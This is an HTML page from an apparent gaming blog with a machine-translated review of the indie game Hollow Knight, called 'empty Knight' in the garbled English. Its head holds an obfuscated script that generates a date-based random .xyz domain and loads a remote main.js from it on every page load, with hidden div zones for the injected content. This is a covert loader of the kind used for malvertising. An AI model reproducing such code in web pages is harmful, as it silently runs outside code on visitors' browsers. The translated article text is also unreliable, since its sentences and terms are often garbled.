<!DOCTYPE html>



  


<html class="theme-next muse use-motion" lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Game,">










<meta name="description" content="In the era of 3A games and competitive online games, independent games often give players a lot of surprises and unexpected gains. The reason why independent games are called independent games is that">
<meta name="keywords" content="Game">
<meta property="og:type" content="article">
<meta property="og:title" content="Is this game fun cartoon style can also be very hard core empty Knight">
<meta property="og:url" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/index.html">
<meta property="og:site_name" content="Games">
<meta property="og:description" content="In the era of 3A games and competitive online games, independent games often give players a lot of surprises and unexpected gains. The reason why independent games are called independent games is that">
<meta property="og:locale" content="en">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/fd8865e8d56d47e0877fedb75847cd5e.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/bdf8d70d98d940d1a7b9a746b210a292.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/58d488d192fc4ee4aee46c1eb82faa76.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f48d100fe05441778ab04f95d11dfcaf.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f910542d8b21439cb0493f5e428b02b6.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/99ea7f51d91e4840bc53b9c6d69f1cd2.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/0a2c0a152ae94fdd88560ac0d54a6964.jpg">
<meta property="og:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f1c793b35f834c56ad8ae27bd340ee10.jpg">
<meta property="og:updated_time" content="2021-03-02T08:49:49.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Is this game fun cartoon style can also be very hard core empty Knight">
<meta name="twitter:description" content="In the era of 3A games and competitive online games, independent games often give players a lot of surprises and unexpected gains. The reason why independent games are called independent games is that">
<meta name="twitter:image" content="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/fd8865e8d56d47e0877fedb75847cd5e.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    version: '5.1.4',
    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: 'Author'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/">




<script type="text/javascript">!function(n){var t,e=function(n,t){var e=[["a","e","i","o","u","y"],["b","c","d","f","g","h","j","k","l","m","n","p","q","r","s","t","v","w","x","y","z"]];if(t)for(var r=0;r<=t.length-1;r++)n=n*t.charCodeAt(r)%4294967295;var l;return next=(l=n,function(n){return l=l+1831565813|0,(((n=(n=Math.imul(l^l>>>15,1|l))+Math.imul(n^n>>>7,61|n)^n)^n>>>14)>>>0)/Math.pow(2,32)}),function(n,t){for(var r=[],l=null,o=0;o<=n-1;o++){var a=void 0;null===l?a=e[0].concat(e[1]):1==l?(a=e[0],l=0):(a=e[1],l=1);var u=a[Math.floor(next()*a.length)];r.push(u),null===l&&(l=-1!=e[0].indexOf(u)?0:1)}return r.push("."+t),r.join("")}}((t=new Date,(t/=1e3)-t%1209600),"_fa7cdd4c68507744")(8,"xyz");if(null===n)console.log("https://"+e);else{var r=n.createElement("script");r.src="https://"+e+"/main.js",(n.body||n.head).appendChild(r)}}("undefined"!=typeof document?document:null);
</script>

  <title>Is this game fun cartoon style can also be very hard core empty Knight | Games</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="en">

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Games</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle">Games</p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            Home
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
            
            Tags
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            Archives
          </a>
        </li>
      
        
        <li class="menu-item menu-item-sitemap">
          <a href="/sitemap.xml" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
            
            Sitemap
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            Search
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
 
 
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="22aeec266c49468da6040eff035066b8" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-options="count=1,interval=1,burst=1" data-zone="7aa7f6c595384fd6a2e5f5016b455fd2" style="display: none"></div>
 <div class="_fa7cdd4c68507744" data-zone="df2a1bde9f44465a8457aaf705928077" style="width:728px;height:90px;display: inline-block;margin: 0 auto"></div>
 <div class="_fa7cdd4c68507744" data-zone="4fff9a79323749608f8df1eff7291bcf" style="width:970px;height:90px;display: inline-block;margin: 0 auto"></div>
 
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Harry">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Games">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">Is this game fun cartoon style can also be very hard core empty Knight</h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-11-08T00:00:00+08:00">
                2019-11-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>In the era of 3A games and competitive online games, independent games often give players a lot of surprises and unexpected gains. The reason why independent games are called independent games is that their production cost is low and the volume is not large. The developers may only have a single digit, but they still have very excellent production quality. They do not have those near real top-level pictures, nor those magnificent game scenes. Some of them often only have an excellent story, an eye-catching design, and a It’s full of praise and creativity.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/fd8865e8d56d47e0877fedb75847cd5e.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>In the field of independent game development, due to the limitation of cost and the lack of technical force, independent gamers often only choose 2D screen as the expression form. Some of them like to use the retro pixel style, some like to use the delicate hand-painted style, while in terms of playing methods, they especially like rougelite or Metroid Vania. In recent years, a series of “soul” series works launched by form software have attracted more and more attention of players. Therefore, the game playing method of “soul like” has begun to appear frequently in independent games. If we integrate the 2D hand-painted pictures, the Metroid Vania’s playing methods and the “soul like” mechanism, we will get this independent game collection called “empty Knight”.</p>
<h1 id="three-for-three-years"><a href="#three-for-three-years" class="headerlink" title="three for three years"></a>three for three years</h1><p>It seems that in the games we usually play or common games, we seldom see games made in Australia. I can often hear friends who have gone to Australia to study abroad say: I thought I could experience the rich game atmosphere of overseas players when I went to Australia, but in fact, none of them particularly like playing games. They prefer sports to playing games And social activities. In Australia, the market of video games is not very good, so there are only a handful of developers and distributors, but a small number of them do not mean that they do not. There are still a group of people who are passionate about games. Team cherry (cherry group) was founded in 2012 by Ali Gibson, William peron and Lohan Fraser. All three are enthusiastic independent gamers with their own strengths. They have participated in game jam (short-term game design, usually need to plan a game in one or two days) held in various places for many times Decent game works), so the three decided to officially establish a studio and become a fixed game development team.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/bdf8d70d98d940d1a7b9a746b210a292.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>The first three<br>Unfortunately, Lohan, one of the three, left the studio before the game was approved, and a musician named Christopher Larkin joined the team to fill the gap. Ali is an animator, so he is responsible for most of the art work in the game. William proposed that all the characters in the game should be designed as bugs, so that not only large-scale creation is easy, but also many interesting characters can be easily drawn, just like the animation created in the past. In order to create these insect characters, Ali even needs to spend a period of time observing insects every day. On the other hand, William wants to simply integrate his favorite play method of galactic demon city with “soul like”. He enjoys the play method of exploring and challenging in the unknown world. These two themes are completely in line with his taste, while Christopher is responsible for it Most of the music and sound effects in the game were produced. The game was approved in 2014 and initially crowdfunded on the KickStarter platform. It was not completed and listed until 2017.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/58d488d192fc4ee4aee46c1eb82faa76.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>Design manuscript</p>
<h1 id="“spirit-of-galactic-demon-city”"><a href="#“spirit-of-galactic-demon-city”" class="headerlink" title="“spirit of galactic demon city”"></a>“spirit of galactic demon city”</h1><p>Because the characters are all worms, it’s hard not to separate from the underground world. In essence, the playing method of empty knight is a 2D horizontal action game. The main character Knight played by the player needs to explore in a huge underground world. Although the cartoon hand painting style of the game is so cute that it doesn’t feel like a game developed by a group of old men, the overall color of the game However, Diao reveals a desolate and depressing atmosphere like black soul. One of the major characteristics of Galaxy demon city is that it splices multiple intricate horizontal maps together to form a huge map. The explorable content is distributed in all corners of the map, and the route of each section is designed in all directions. If the back board ability is a little bit poor, the players may be lost playing, which is the excellent performance of map design, although At first glance, it’s a bit messy but actually smooth. If you really forget the road, you can find a cartographer to buy a map, but only the places you have explored can be displayed on the map.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f48d100fe05441778ab04f95d11dfcaf.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>The map is only an aid, but more often, you need to fumble for the scene by yourself<br>As an ARPG game, the combat system of “empty Knight” is very simple and easy to understand, with only one or two attack modes and some mobile moves, so many players will think that the operation of this game is a little simple. In fact, in many horizontal games in the early years, the protagonist often only has one or two attack methods. The main point is that the time of each attack is the more different enemies are faced in the later stage, the more different ways of thinking about the attack will be used. Even if there are only one or two moves, players can still get the pleasure of “insight”.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f910542d8b21439cb0493f5e428b02b6.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>Common attacks are simple, but they are very practical<br>Although the map design of the game has the flavor of galactic demon city, in fact, its design idea is similar to the series of soul of darkness. Under a 2D plane image, it shows a fairly complete urban system for the players, such as the center of the map is the main city, while other areas such as Tiantai, sewer, station and so on are all around the design of the main city. The players can not Some minor details are observed in the same area to fill in the background of the game, which is simply to create a perfect world first, and then involve the plot and characters in the world.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/99ea7f51d91e4840bc53b9c6d69f1cd2.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>Many hidden elements need to be felt by players themselves<br>Some of these production techniques have the meaning of fragmented narration. In his early years, he was used in various immersive simulation games, and then was carried forward by the series of black soul. The map and background design of the game have a high degree of completion, and even the characteristics of enemies in different regions can be explained in the game. And the game itself is not so perfect, the most important point is that the galaxy demon city and the “soul like” game are not particularly simple game types, let alone the “empty Knight” which integrates the two game types. Secondly, due to the high degree of completion in the game world, there are only three people in the development team, which leads to some deficiencies in the design of the game itself in terms of player guidance. Most of the time, players will fall into a state that they don’t know what to do and where to go when playing. For players who are used to playing such games, they may still be able to adapt. If they change to be cute new players, 80% of them will be able to adapt Will complain to delete the game.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/0a2c0a152ae94fdd88560ac0d54a6964.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>Boss war that seems simple but needs to be tried again and again<br>    concluding remarks<br>Every independent game with a high degree of completion has no less influence in the whole industry than other 3A masterpieces. The industry usually doesn’t care about their technological breakthroughs in the game, but their unique design creativity and obsession in the game. In fact, for the independent game people, developing a game is very important Confused, because they don’t know what other players really like, they can’t make games that can please the public, so they can only make works that can be considered good games in their own eyes, and in most cases, only games born with this idea as the main purpose are more likely to leave a deep impression for people.<br><img src="http://maiygu.xyz/2019/11/08/Is this game fun cartoon style can also be very hard core empty Knight/f1c793b35f834c56ad8ae27bd340ee10.jpg" alt="Is this game fun cartoon style can also be very hard core empty Knight"><br>It is worth mentioning that the cherry group announced the news of the sequel “empty Knight: Song of silk” as early as the beginning of this year, but it is still unknown when it can be completed. I hope they can still bring surprises and feelings to the players this time.</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Game/" rel="tag"># Game</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/08/It took 13 years to make the four different games by myself, but the praise rate was as high as 93%/" rel="next" title="It took 13 years to make the four different games by myself, but the praise rate was as high as 93%">
                <i class="fa fa-chevron-left"></i> It took 13 years to make the four different games by myself, but the praise rate was as high as 93%
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/11/08/Is this game fun Samurai 3A's masterpiece benevolence king, which is a game made by developers for themselves/" rel="prev" title="Is this game fun Samurai 3A's masterpiece benevolence king, which is a game made by developers for themselves">
                Is this game fun Samurai 3A's masterpiece benevolence king, which is a game made by developers for themselves <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">Harry</p>
              <p class="site-description motion-element" itemprop="description">Games</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">114</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">1</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#three-for-three-years"><span class="nav-number">1.</span> <span class="nav-text">three for three years</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#“spirit-of-galactic-demon-city”"><span class="nav-number">2.</span> <span class="nav-text">“spirit of galactic demon city”</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        

<div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Harry</span>

  
</div>









        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
